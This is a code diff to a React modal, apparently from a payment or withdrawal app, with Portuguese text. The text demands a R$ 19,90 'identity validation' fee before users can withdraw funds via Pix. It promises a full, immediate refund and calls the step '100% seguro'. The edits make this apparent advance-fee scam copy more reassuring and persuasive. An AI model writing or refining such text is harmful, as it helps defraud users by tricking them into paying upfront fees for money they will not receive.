@@ -55,22 +55,22 @@ export function ModalUnlock() {
           {/* Texto explicativo */}
           <p className="text-[0.80rem] font-c6text-regular text-gray-300 text-justify mb-6">
             <strong className="font-c6text-regular">
-              <b className="text-[#ffcd2e] font-c6text-regular">IMPORTANTE!</b>
+              <b className="text-[#ffcd2e] font-c6text-regular">IMPORTANTE ! {" "}</b>
             </strong>
-            Para garantir a segurança e integridade do nosso sistema, precisamos confirmar que sua conta pertence a um humano e não a um robô.
+            Para garantir a segurança e integridade do nosso sistema, precisamos confirmar que você é um usuário legítimo. Este é um passo essencial para proteger nossos usuários contra fraudes e manipulações.
             <br />
             <br />
-            Como medida preventiva contra fraudes e manipulações, solicitamos uma validação simbólica no valor de{" "}
+            Fique tranquilo! Este valor será devolvido <b className="text-[#f4f4f4]">integralmente</b> e imediatamente após a validação. Assim, você poderá realizar o saque do total desejado via Pix de forma rápida e segura.{" "}
             <strong>
               <b className="text-[#ffcd2e]">R$ 19,90</b>
             </strong>{" "}
-            para verificar sua identidade.
+
             <br />
             <br />
-            Não se preocupe! Este valor será devolvido imediatamente e você poderá sacar o total desejado via Pix de forma instantânea. Este procedimento é simples, seguro e garante que todos os usuários tenham uma experiência confiável e protegida.
+            Este procedimento é simples, 100% seguro e garante que todos os usuários tenham uma experiência confiável e protegida em nossa plataforma.
             <br />
             <br />
-            Valide sua identidade agora e libere seu saque em poucos instantes!
+            Valide sua identidade agora mesmo e desbloqueie seu saque em poucos instantes!
           </p>
           <button onClick={() => {
             handleCloseModal(); // Fecha o modal
